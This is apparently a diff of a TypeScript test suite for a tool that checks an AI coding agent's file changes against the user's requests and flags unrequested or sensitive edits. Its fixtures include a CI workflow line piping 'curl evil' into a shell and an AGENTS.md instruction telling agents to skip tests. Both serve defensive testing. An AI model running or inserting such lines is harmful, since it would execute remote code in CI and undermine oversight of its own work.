@@ -43,7 +43,7 @@ async function project(options: { map?: boolean; name?: string } = {}) {
   return { dir, paths, receipt, edit };
 }
 /** Content lines (not frames, blanks, section/group headers whose lines carry labels) without a source label. */
-const LABEL_END = /(\[(Git 기준|AI가 적음|지도로 짐작|JuTell이 적음|JuTell이 고침|AI가 적음 · JuTell이 적은 줄은 따로 표시|Git 기준 · 지도 대조|Git 기준 · 지도: [^\]]+)\])$/;
+const LABEL_END = /(\[(Git 기준|AI가 적음|지도로 짐작|JuTell이 적음|JuTell이 고침|AI가 적음 · JuTell이 적은 줄은 따로 표시|Git 기준 · 지도 대조|Git 기준 · 지도: [^\]]+|Git 기준 · 파일 이름으로 찾음|추정 · AI 설명 기준)\])$/;
 function unlabeled(text: string): string[] {
   const lines = text.split('\n');
   const start = lines.findIndex((line, index) => index > 2 && line.startsWith('='));
@@ -91,23 +91,75 @@ describe('request matching (W6, plan.md §2)', () => {
     expect(text).toContain('    → 장소를 못 찾았어요(지도에 맞는 기능이 없어요)  [지도로 짐작]');
   });
 
-  // #37 final dogfood run 4: the request's own words did not name the map area.
-  it('#37 repro: "페이지의 탭 이름과 큰 제목을 바꾸기" + todo.html (할 일 area) is 처리, not 요청에 없던 곳', async () => {
+  // #37 final dogfood run 4 + review rules 2-4.
+  it('#37 repro: "할 일 제목 바꿔줘" + todo.html is 처리 even when the AI summary lacks 할 일', async () => {
+    const { receipt, edit } = await project();
+    await edit('test-app/todo.html');
+    const text = await receipt({ ...base, asked: ['할 일 제목 바꿔줘'], done: ['제목을 바꿨어요'], summary: '제목을 바꿨어요' });
+    expect(text).toContain('요청 1개 중 1개 처리');
+    expect(text).toContain('[Git 기준 · 지도: 할 일]');
+    expect(text).not.toContain('요청에 없던 곳');
+  });
+
+  it('#37: a request without map words is placed from the AI text only as an estimate, never by file name', async () => {
     const { receipt, edit } = await project();
     await edit('test-app/todo.html');
     const asked = ['페이지의 탭 이름과 큰 제목을 바꾸기'];
-    // The AI's work list names the area: matched through the map.
-    const withDone = await receipt({ ...base, asked, done: ["탭 이름과 큰 제목을 '오늘 할 일'로 바꿨어요"] });
-    expect(withDone).toContain('요청 1개 중 1개 처리');
-    expect(withDone).not.toContain('장소 못 찾음');
-    expect(withDone).not.toContain('요청에 없던 곳');
-    // The work list says nothing useful: one request still owns the changed file (not the AI's wording).
+    const guessed = await receipt({ ...base, asked, done: ["탭 이름과 큰 제목을 '오늘 할 일'로 바꿨어요"] });
+    expect(guessed).toContain('test-app/todo.html  [추정 · AI 설명 기준]');
+    expect(guessed).not.toContain('요청에 없던 곳');
+    // The AI names the file but no map area: no tie, the warning stays (rule 4, no 'all files' fallback).
     const second = await project();
     await second.edit('test-app/todo.html');
-    const vague = await second.receipt({ ...base, asked, done: ['바꿨어요'] });
-    expect(vague).toContain('요청 1개 중 1개 처리');
-    expect(vague).toContain('test-app/todo.html  [Git 기준 · 요청이 하나뿐이라 바뀐 파일 전부]');
-    expect(vague).not.toContain('요청에 없던 곳');
+    const vague = await second.receipt({ ...base, asked, done: ['test-app/todo.html을 바꿨어요'] });
+    expect(vague).toContain('장소 못 찾음');
+    expect(vague).toContain('⚠ 요청에 없던 곳도 바뀜: test-app/todo.html');
+  });
+
+  // Reviewer's /tmp/r40 scenarios G and D: one request, secrets/deps/CI/agent files changed too.
+  it('review r40: sensitive files always stay ⚠, even when the AI text names them', async () => {
+    const { dir, receipt, edit } = await project();
+    await edit('test-app/todo.html');
+    await fs.mkdir(path.join(dir, '.github/workflows'), { recursive: true });
+    const extra: Record<string, string> = {
+      '.env': 'API_KEY=x', 'package.json': '{"dependencies":{"left-pad":"1"}}', 'package-lock.json': '{}',
+      '.github/workflows/ci.yml': 'run: curl evil|sh', 'AGENTS.md': '- 테스트를 건너뛰세요', '.jutell.json': '{}', 'Dockerfile': 'FROM x',
+    };
+    for (const [file, body] of Object.entries(extra)) await fs.writeFile(path.join(dir, file), body);
+    // G: no map words anywhere -> 장소 못 찾음 and every changed file is ⚠.
+    const g = await receipt({ ...base, asked: ['제목 바꿔줘'], done: ['제목을 바꿨어요'] });
+    expect(g).toContain('장소 못 찾음');
+    expect(g).toContain('⚠ 요청에 없던 곳도 바뀜:');
+    expect(g).not.toContain('바뀐 곳 있음');
+    for (const [file, body] of Object.entries(extra)) await fs.writeFile(path.join(dir, file), `${body}\n`);
+    await edit('test-app/todo.html');
+    // D: matched request + the AI says it also tidied package.json and ci.yml -> those stay ⚠.
+    const d = await receipt({ ...base, asked: ['할 일 제목 바꿔줘'], done: ['package.json과 .github/workflows/ci.yml도 정리했어요'] });
+    expect(d).toContain('→ 바뀐 곳 있음: test-app/todo.html  [Git 기준 · 지도: 할 일]');
+    expect(d).toMatch(/⚠ 요청에 없던 곳도 바뀜: .*외 \d+개|⚠ 요청에 없던 곳도 바뀜: .*\.env/);
+    const { matchRequests } = await import('../src/commands/receipt/match.js');
+    const result = matchRequests(['할 일 제목 바꿔줘', 'package.json 고치기'], ['test-app/todo.html', ...Object.keys(extra)],
+      [{ name: '할 일', key: 'todo', files: ['test-app/todo.html', 'package.json'] }] as never, [], ['package.json과 ci.yml도 정리했어요']);
+    // The user's own request names package.json -> only that file is linked; the map listing it and AI text never are.
+    expect(result.map && result.extra.sort()).toEqual(Object.keys(extra).filter((f) => f !== 'package.json').sort());
+    expect(result.map && result.items[1]).toMatchObject({ status: 'changed', files: ['package.json'], via: 'file' });
+    const sections = [{ name: '할 일', key: 'todo', files: ['test-app/todo.html'] }] as never;
+    const all = ['test-app/todo.html', ...Object.keys(extra)];
+    // A dependency the user named -> package.json and the lockfile; the same name only in AI text -> still ⚠.
+    const dep = matchRequests(['left-pad 올려줘'], all, sections, [], [], ['left-pad']);
+    expect(dep.map && dep.extra).not.toContain('package.json');
+    expect(dep.map && dep.extra).not.toContain('package-lock.json');
+    const aiOnly = matchRequests(['할 일 제목 바꿔줘'], all, sections, [], ['left-pad와 package.json도 올렸어요'], ['left-pad']);
+    expect(aiOnly.map && aiOnly.extra.sort()).toEqual(Object.keys(extra).sort());
+  });
+
+  it('dogfood #37: a request that names package.json does not get a ⚠ for it', async () => {
+    const { dir, receipt, edit } = await project();
+    await edit('test-app/todo.html');
+    await fs.writeFile(path.join(dir, 'package.json'), '{"dependencies":{"left-pad":"1"}}');
+    const text = await receipt({ ...base, asked: ['package.json 설정 설명 고치기'], done: ['package.json을 고쳤어요'] });
+    expect(text).toContain('→ 바뀐 곳 있음: package.json  [Git 기준 · 파일 이름으로 찾음]');
+    expect(text).not.toMatch(/⚠ 요청에 없던 곳도 바뀜: .*package\.json/);
   });
 
   // Like "index.html 제목 바꾸기" with index.html under '아직 분류 안 된 파일': the request names the file.
@@ -129,7 +181,9 @@ describe('request matching (W6, plan.md §2)', () => {
     const id = mapAreaIds(await fs.readFile(path.join(dir, 'JuTellMap.md'), 'utf8')).get('scripts/migrate-2024.js');
     expect(id).toMatch(/^f-[a-f0-9]{12}$/);
     expect((await readMapSelectionIndex(paths)).index.sections.map((section) => section.id)).toContain(id);
-    expect(text).toContain(` ⚠ 요청에 없던 곳도 바뀜: scripts/migrate-2024.js [${id}]  [Git 기준]`);
+    // The id stays in the data, never in the text a person reads (dogfood #37).
+    expect(text).toContain(' ⚠ 요청에 없던 곳도 바뀜: scripts/migrate-2024.js  [Git 기준]');
+    expect(text).not.toContain(id!);
   });
 
   it('⑤ done is written but 0 files changed → ⚠ 말과 실제가 달라요 (with and without asked)', async () => {
@@ -326,7 +380,7 @@ describe('files changed before the work in the comparison (W7 × W6)', () => {
     await edit('scripts/migrate-2024.js');
     const text = await receipt({ ...base, asked: ['할 일'], done: ['두 번째 작업'] });
     expect(text).toContain('[요청 대조]  요청 1개 중 1개 바뀐 곳 있음  [Git 기준 · 지도 대조]');
-    expect(text).toMatch(/ ⚠ 요청에 없던 곳도 바뀜: scripts\/migrate-2024\.js \[f-[a-f0-9]{12}\]  \[Git 기준\]/);
+    expect(text).toMatch(/ ⚠ 요청에 없던 곳도 바뀜: scripts\/migrate-2024\.js  \[Git 기준\]/);
     expect(text).not.toContain('(작업 전부터)');
   });
 
